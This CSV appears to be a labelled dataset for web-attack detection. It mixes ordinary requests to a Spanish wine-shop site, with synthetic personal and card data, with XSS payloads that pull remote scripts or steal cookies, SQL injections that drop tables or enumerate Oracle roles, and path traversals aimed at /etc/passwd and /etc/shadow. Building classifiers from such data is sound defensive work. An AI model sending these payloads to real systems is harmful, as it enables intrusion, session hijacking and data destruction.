miembros/editar.jsp?modo=registro&login=szeto&password=d%E9cada&nombre=Saturnina&apellidos=Pin%F3s+Turrubiartes&email=delpy_wrixon%40tecnoindomo.gs&dni=15314533Y&direccion=Calle+Madre+De+Dios%2C+102+&ciudad=Perafort&cp=37500&provincia=C%E1ceres&ntc=9634788762109730&B1=Registrar,normal,0.269886921
publico/productos.jsp,normal,0.540408277
miembros/index.jsp,normal,0.385783975
../../../../../../../../../../../../localstart.asp%00,traversal,0.831069131
imagenes/logo.gif,normal,0.419851576
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito,normal,0.229636986
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal,0.989834867
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal,0.18993464
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.716752113
global/creditos.jsp,normal,0.143926103
miembros/editar.jsp?modo=registro&login=lonald8&password=86Et4aR&nombre=Fabricio&apellidos=Linares+Barreras&email=kyle%40psykoterapeut.tv&dni=02906029W&direccion=Pasaje+Arquitecto+Gaudi+85%2C+&ciudad=Santa+Marina+del+Rey&cp=31594&provincia=Granada&ntc=9047664799943774&B1=Registrar,normal,0.148902897
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss,0.394711467
global/creditos.jsp,normal,0.819764041
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss,0.410450629
global/menum.jsp,normal,0.336103525
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal,0.842385405
"<;META HTTP-EQUIV="";Link""; Content="";<;http://ha.ckers.org/xss.css>;; REL=stylesheet"";>;",xss,0.366626395
imagenes/cmenbul.gif,normal,0.395065522
miembros/editar.jsp?modo=registro&login=yeo-hoon&password=eSpIlOc3o&nombre=Heldo&apellidos=Bernad+Fermoselle&email=brazzi%40cortell.gs&dni=15495714Q&direccion=Larrazabal%2C+S%2FN%2C+11-B&ciudad=Muriel+de+la+Fuente&cp=45800&provincia=Granada&ntc=8489461843085797&B1=Registrar,normal,0.354648772
../../{FILE},traversal,0.809585664
global/titulo.jsp,normal,0.639365588
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.880820665
miembros/salir.jsp,normal,0.821845805
miembros/index.jsp,normal,0.100859651
imagenes/cmenbul.gif,normal,0.901489161
imagenes/2.gif,normal,0.789040366
imagenes/cmenbul.gif,normal,0.073108712
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE},traversal,0.939362801
"UEv1n: select * from users where id=1 union select @ 1a,version() -- 1",sqli,0.578523012
"1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1",sqli,0.676820501
miembros/imagenes/ogono.jpg,normal,0.100180913
“><<script>alert(document.cookie);//<</script>,xss,0.200287245
global/titulo.jsp,normal,0.603503488
..%u2216..%u2216{FILE},traversal,0.031199306
miembros/imagenes/zarauz.jpg,normal,0.882013075
global/titulo.jsp,normal,0.277894747
"<;STYLE>;@im\port';\ja\vasc\ript:alert("";XSS"";)';;<;/STYLE>;",xss,0.308258796
global/menum.jsp,normal,0.194801129
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.803157617
miembros/index.jsp,normal,0.694513015
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,xss,0.451865837
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.885412664
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,xss,0.579638924
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.558618276
publico/productos.jsp,normal,0.332124301
publico/caracteristicas.jsp?id=2,normal,0.852956244
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss,0.965204507
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito,normal,0.339118141
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss,0.970723963
imagenes/3.gif,normal,0.948806928
publico/miembros.jsp,normal,0.486158211
123);DROP%20TABLE%20users--,sqli,0.866283018
publico/caracteristicas.jsp?id=2,normal,0.902070483
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.319497836
imagenes/2.gif,normal,0.443409963
imagenes/logo.gif,normal,0.97985289
imagenes/3.gif,normal,0.525922498
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",sqli,0.86560179
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.496381783
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.563962087
imagenes/logo.gif,normal,0.939514511
global/creditos.jsp,normal,0.803976402
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss,0.428203448
publico/pagar.jsp?modo=insertar&precio=4881&B1=Pasar+por+caja,normal,0.326794054
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal,0.159143282
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=51&B1=A%F1adir+al+carrito,normal,0.188241508
publico/pagar.jsp?modo=insertar&precio=7728&B1=Pasar+por+caja,normal,0.113719686
.\..\.\..\.\..\.\..\.\..\{FILE},traversal,0.149244641
miembros/index.jsp,normal,0.341759507
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.877778908
global/titulo.jsp,normal,0.520456385
miembros/imagenes/zarauz.jpg,normal,0.892117789
imagenes/cmenbul.gif,normal,0.924522356
miembros/imagenes/zarauz.jpg,normal,0.220616029
imagenes/3.gif,normal,0.932230619
publico/pagar.jsp?modo=insertar&precio=7492&B1=Pasar+por+caja,normal,0.113648468
publico/autenticar.jsp?modo=entrar&login=jaquith&pwd=pApAndUJo&remember=off&B1=Entrar,normal,0.949732103
..%2f..%2f{FILE},traversal,0.212764461
publico/autenticar.jsp?modo=entrar&login=singyu&pwd=e88r6ber%EDa&remember=off&B1=Entrar,normal,0.116558085
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss,0.724723964
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},traversal,0.614647679
index.jsp,normal,0.52095254
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss,0.119331391
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.3834392
./\/././\/././\/././\/././\/././\/./{FILE},traversal,0.742770327
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.355070421
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss,0.35874492
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss,0.856616091
miembros/editar.jsp?modo=registro&login=mareah&password=malh5jo&nombre=Eulalio&apellidos=Tal%F3+Gorriz&email=trissenaar%40tetdevelocidad.uk&dni=18684547Z&direccion=C%2F+Hermanos+Senise+Colmenero%2C+153%2C+3-D&ciudad=Forua&cp=08470&provincia=Valencia&ntc=9004541540453342&B1=Registrar,normal,0.00924173
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal,0.779256669
miembros/index.jsp,normal,0.263949779
"snns: select * from users where id=1 or ""$_"" or 1=1 -- 1",sqli,0.060115907
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss,0.555312897
..%uF025..%uF025{FILE},traversal,0.400280485
index.jsp,normal,0.257842992
imagenes/1.gif,normal,0.398869168
&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1,sqli,0.905979095
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss,0.325167785
publico/caracteristicas.jsp?id=2,normal,0.713614101
imagenes/2.gif,normal,0.179980585
publico/productos.jsp,normal,0.165426915
publico/pagar.jsp?modo=insertar&precio=9791&B1=Confirmar,normal,0.350708273
miembros/imagenes/ogono.jpg,normal,0.279518234
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal,0.744166351
publico/productos.jsp,normal,0.958771396
publico/miembros.jsp,normal,0.197526175
' or ''&',sqli,0.43299872
index.jsp,normal,0.428771926
%00../../../../../../etc/shadow,traversal,0.082193916
global/titulo.jsp,normal,0.980999901
publico/miembros.jsp,normal,0.071563116
miembros/index.jsp,normal,0.643117955
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss,0.849915674
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",xss,0.419481952
..\\..\\..\\..\\..\\..\\..\\..\\{FILE},traversal,0.597662751
<scr<script>ipt>alert(1)</scr</script>ipt>,xss,0.740792747
index.jsp,normal,0.4394245
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,0.699710765
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.656353344
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,0.476018645
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss,0.415057298
publico/autenticar.jsp?modo=entrar&login=safaa6&pwd=ilUSivA&remember=on&B1=Entrar,normal,0.171708335
%c0%ae%c0%ae\{FILE},traversal,0.526553369
imagenes/3.gif,normal,0.304529486
miembros/editar.jsp?modo=registro&login=phan&password=enJalbegada&nombre=Anatoly&apellidos=Antypas+Sardans&email=stanczak-kasem%40movil-google.tj&dni=08071780E&direccion=C%2F+Rodenas+170%2C+11%3FG&ciudad=Santa+Cristina+de+Valmadrigal&cp=08110&provincia=Burgos&ntc=7812372382354284&B1=Registrar,normal,0.005217076
global/menum.jsp,normal,0.884493642
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.930211189
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss,0.169900363
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss,0.27734167
publico/miembros.jsp,normal,0.882027421
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=39&B1=A%F1adir+al+carrito,normal,0.889213475
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss,0.124959592
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss,0.996394547
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.423791279
..%5c..%5c{FILE},traversal,0.599808912
"'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'",sqli,0.68792846
miembros/imagenes/zarauz.jpg,normal,0.570705944
""">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",xss,0.910236438
imagenes/nuestratierra.jpg,normal,0.832886939
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss,0.650448938
..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.359796543
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",xss,0.423557307
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.401816537
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss,0.996771867
%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal,0.930414754
..%255c..%255c{FILE},traversal,0.803541173
publico/autenticar.jsp?modo=entrar&login=raing&pwd=zaca2%ED7&remember=on&B1=Entrar,normal,0.331884888
index.jsp,normal,0.607737309
publico/registro.jsp?modo=registro&login=jwahar&password=perfecci%F3n&nombre=Anan%EDas&apellidos=Manzano+Babot&email=couri-manahan%40copiar.com.fm&dni=72622550G&direccion=Josep+Pallch+i+Carola%2C+199%2C+4-E&ciudad=Mandayona&cp=09124&provincia=Salamanca&ntc=6135978760612674&B1=Registrar,normal,0.696236035
"UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1",sqli,0.337297092
publico/miembros.jsp,normal,0.211708629
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",xss,0.845903172
imagenes/2.gif,normal,0.154322639
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal,0.414089647
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss,0.286843448
</title><SCRIPT>document.vulnerable=true;</script>,xss,0.791788437
miembros/imagenes/castro.jpg,normal,0.230426628
...\...\...\{FILE},traversal,0.946941847
index.jsp,normal,0.973467949
"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",xss,0.750102188
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito,normal,0.752658819
publico/carrito.jsp,normal,0.312911136
../../{FILE},traversal,0.828577162
publico/autenticar.jsp?modo=entrar&login=lijphart&pwd=*ramonear&remember=off&B1=Entrar,normal,0.961196832
"<;SCRIPT a="";blah""; ';'; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss,0.880489174
imagenes/cmenbul.gif,normal,0.929226983
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss,0.869769499
../..//../..//../..//../{FILE},traversal,0.279243062
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal,0.609090643
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss,0.34510746
imagenes/1.gif,normal,0.943761365
publico/caracteristicas.jsp?id=1,normal,0.249166087
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.030577219
imagenes/logo.gif,normal,0.801986983
"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",xss,0.815659472
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss,0.340123411
publico/carrito.jsp,normal,0.36340356
%00/etc/passwd%00,traversal,0.261982864
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=37&B1=A%F1adir+al+carrito,normal,0.769739869
miembros/salir.jsp,normal,0.15186537
publico/pagar.jsp?modo=insertar&precio=3815&B1=Pasar+por+caja,normal,0.694536045
miembros/fotos.jsp,normal,0.255661085
....\{FILE},traversal,0.823000747
imagenes/2.gif,normal,0.418827441
imagenes/1.gif,normal,0.364934579
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss,0.139791816
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.023906437
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;,xss,0.489620216
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.489369799
miembros/imagenes/ogono.jpg,normal,0.20511008
imagenes/2.gif,normal,0.215672584
imagenes/3.gif,normal,0.87943633
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss,0.351414748
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=16&B1=A%F1adir+al+carrito,normal,0.351447015
PRINT,sqli,0.035811873
publico/registro.jsp?modo=registro&login=pandrang&password=sABIONda&nombre=Edi&apellidos=Nicol%E0s&email=woodburn%40vinavilano.hr&dni=13026737C&direccion=De+Los+Cazadores%2C+196%2C+1-B&ciudad=Villanueva+de+Huerva&cp=31172&provincia=Segovia&ntc=7280653157576508&B1=Registrar,normal,0.077751927
miembros/salir.jsp,normal,0.019416589
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss,0.060927294
imagenes/2.gif,normal,0.140370973
"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss,0.186597811
imagenes/3.gif,normal,0.808479614
"admin""/*",sqli,0.343963603
global/estilos.css,normal,0.470670977
<IMG SRC=javascript:javascript:alert(1)>,xss,0.468283668
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss,0.896176899
miembros/fotos.jsp,normal,0.041606124
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss,0.180618147
global/creditos.jsp,normal,0.012099317
imagenes/2.gif,normal,0.82995414
miembros/editar.jsp?modo=registro&login=wicht&password=Cho5Readu3a&nombre=Iago&apellidos=Casademonts&email=abdushilov%40mundoapple.kn&dni=21762453Z&direccion=Plaza+Conde+De+Carlet%2C+40+&ciudad=Beires&cp=03180&provincia=Palencia&ntc=4300788041091326&B1=Registrar,normal,0.704480212
miembros/salir.jsp,normal,0.932795479
"#""><img src=M onerror=alert('XSS');>",xss,0.250050322
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.17910564
..%255c..%255c..%255c{FILE},traversal,0.025908786
"UEv&1: select * from users where id=1 union select @||1,version() -- 1",sqli,0.242384263
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss,0.144444015
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss,0.154262885
miembros/imagenes/ogono.jpg,normal,0.488255177
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE},traversal,0.627303398
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss,0.686865669
"s?)s: select * from users where id=1 or ""])"" or 1=1 -- 1",sqli,0.945932857
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss,0.118222376
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.949358111
"""`'><script>\x20javascript:alert(1)</script>",xss,0.873963928
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss,0.508788911
publico/registro.jsp?modo=registro&login=wilson&password=mo8os7&nombre=Jaaziel&apellidos=Pirotto+Nin&email=carew1%40koinup.ni&dni=69309273S&direccion=Calle+Practicante+Calixto+Rodriguez+163%2C+&ciudad=Zael&cp=16582&provincia=A+Coru%F1a&ntc=6959239796912888&B1=Registrar,normal,0.76409012
0x2e0x2e0x2f{FILE},traversal,0.960678488
publico/caracteristicas.jsp?id=1,normal,0.824343148
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",sqli,0.436624704
"<img src=""mocha:document.vulnerable=true;"">",xss,0.247499624
publico/registro.jsp?modo=registro&login=subhashi&password=%2Bfaccioso&nombre=Ademaro&apellidos=Rubau&email=eiffel%40noviasteresapalacios.coop&dni=44578051A&direccion=Ballena%2C+91%2C+10%3FA&ciudad=Cervera+del+R%EDo+Alhama&cp=49130&provincia=Teruel&ntc=8888494677705913&B1=Registrar,normal,0.267835653
&#x03C;,xss,0.451562761
oo&1c: select * from users where id=1 <@<@ or 1=1 -- 1,sqli,0.704893936
publico/carrito.jsp,normal,0.265883886
%3C,xss,0.111767307
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.081599776
global/estilos.css,normal,0.657321509
..%255c..%255c..%255c..%255c..%255c{FILE},traversal,0.983673013
global/creditos.jsp,normal,0.562247329
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.101366585
<embed code=javascript:javascript:alert(1);></embed>,xss,0.134691945
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss,0.108554892
"<div onmouseover=""document.vulnerable=true;"">",xss,0.259517113
index.jsp,normal,0.206757585
miembros/imagenes/castro.jpg,normal,0.489239812
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.656134717
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.708086389
global/estilos.css,normal,0.339035144
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",xss,0.604738157
publico/carrito.jsp,normal,0.376462479
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.506932566
miembros/salir.jsp,normal,0.82308762
miembros/imagenes/zarauz.jpg,normal,0.120714959
&#X003c;,xss,0.264445381
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss,0.752759008
miembros/imagenes/castro.jpg,normal,0.85155601
<BODY ONLOAD=alert('XSS')>,xss,0.771081134
imagenes/3.gif,normal,0.681576236
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",xss,0.872798726
publico/miembros.jsp,normal,0.39016214
publico/registro.jsp?modo=registro&login=holbrook&password=enfermamente&nombre=Berto&apellidos=Puigmitj%E0+Del+Molino&email=coray%40ciaplast.ir&dni=86464472C&direccion=Passatge+Leon%2C+93+8%3FA&ciudad=Cuevas+de+San+Marcos&cp=49250&provincia=C%F3rdoba&ntc=5874582536939538&B1=Registrar,normal,0.068706881
